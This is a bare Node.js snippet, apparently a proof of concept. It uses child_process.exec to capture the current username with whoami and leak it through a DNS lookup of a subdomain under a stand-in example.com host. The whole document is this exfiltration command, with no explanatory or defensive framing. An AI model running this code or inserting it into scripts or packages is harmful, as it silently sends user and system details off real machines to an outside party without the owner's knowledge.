const {exec} = require("child_process");
exec("user=$(whoami) && host $user.internal.example.com", () => {});
